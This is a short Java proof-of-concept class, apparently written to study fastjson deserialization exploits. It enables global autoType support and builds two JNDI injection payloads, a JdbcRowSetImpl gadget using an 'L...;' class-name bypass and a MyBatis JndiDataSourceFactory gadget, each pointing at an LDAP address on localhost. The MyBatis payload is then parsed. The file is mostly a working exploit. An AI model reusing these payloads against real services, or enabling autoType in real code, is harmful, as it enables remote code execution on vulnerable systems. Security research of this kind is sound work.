package com.mechoy;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.util.SimpleTimeZone;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/5/8
 * Description
 */
public class fastjsonTest1 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String s1 = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\"[{\"dataSourceName\":\"ldap://127.0.0.1:8888/pbbLLAew\",\"AutoCommit\":\"true\"}]}";
        String s = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://127.0.0.1:8888/pbbLLAew\"}}";
        JSON.parseObject(s);

        String ss = "{\"@type\":\"com.mechoy.Person\",\"properties\":{\"zzz\":\"111\",\"xxx\":\"222\"}}";
//        JSON.parseObject(ss);
    }
}
